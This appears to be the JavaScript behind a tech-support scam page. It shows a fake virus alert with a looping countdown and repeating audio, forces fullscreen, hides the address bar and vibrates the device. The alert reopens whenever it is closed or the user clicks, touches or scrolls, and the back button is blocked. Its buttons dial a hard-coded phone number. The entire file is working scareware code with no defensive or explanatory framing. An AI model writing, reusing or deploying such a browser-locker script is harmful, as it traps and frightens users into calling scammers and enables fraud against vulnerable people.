$(document).ready(() => {
    function startCountdown() {
        let timeInSeconds = 5 * 60; // 5 minutes in seconds

        const countdown = setInterval(() => {
            let minutes = Math.floor(timeInSeconds / 60);
            let seconds = timeInSeconds % 60;

            // Format minutes and seconds to always show 2 digits
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            // Update the timer display
            document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

            // Decrease time by 1 second
            timeInSeconds--;

            // When the countdown reaches 0, restart the timer
            if (timeInSeconds < 0) {
                clearInterval(countdown);
                startCountdown(); // Restart the countdown
            }
        }, 1000);
    }

    // Start the countdown
    startCountdown();

    const virusModal = document.getElementById("virusModal");
    const modalInstance = new bootstrap.Modal(virusModal);
    const audioPlayer = $("#audioPlayer")[0];

    audioPlayer.play();

    audioPlayer.addEventListener("ended", () => {
        audioPlayer.play();
    });

    // Function to hide address bar and go fullscreen
    function hideAddressBarAndShowModal() {
        setTimeout(() => {
            window.scrollTo(0, 1); // Push page slightly to hide address bar
        }, 1000);

        modalInstance.show(); // Show modal
        navigator.vibrate(200);
    }

    // Function to force fullscreen
    function goFullScreen() {
        const element = document.documentElement; // Use the whole document for fullscreen

        if (element.requestFullscreen) {
            element.requestFullscreen();
        } else if (element.mozRequestFullScreen) {
            // Firefox
            element.mozRequestFullScreen();
        } else if (element.webkitRequestFullscreen) {
            // Chrome, Safari and Opera
            element.webkitRequestFullscreen();
        } else if (element.msRequestFullscreen) {
            // IE/Edge
            element.msRequestFullscreen();
        }
    }

    // Block scrolling by reopening modal
    function preventScroll() {
        modalInstance.show();
        hideAddressBarAndShowModal();
    }

    if (virusModal) {
        // Event listener for when modal is shown
        virusModal.addEventListener("show.bs.modal", () => {
            goFullScreen();
            audioPlayer.play();
        });

        // Event listener for when modal is completely hidden
        virusModal.addEventListener("hidden.bs.modal", () => {
            // Reopen the modal after a short delay
            setTimeout(() => {
                preventScroll();
            }, 300); // 0.3-second delay
        });
    }

    // Prevent upward scrolling by forcing modal
    window.addEventListener("scroll", () => {
        if (window.pageYOffset === 0) {
            preventScroll();
        }
    });

    window.addEventListener("touchstart", preventScroll);
    window.addEventListener("click", preventScroll);

    // Add event listener for button vibration
    $("#vibrateButton").on("click", preventScroll);

    // Add event listeners for call buttons
    $("#callButton, #callButton1, #callButton2").on("click", () => {
        const phoneNumber = "tel:+18778381219"; // Replace with desired phone number
        window.location.href = phoneNumber;
    });

    // Prevent the backspace key from navigating back
    history.pushState(null, null, window.location.href);
    window.onpopstate = () => history.forward();

    // Hide address bar on load
    hideAddressBarAndShowModal();
});
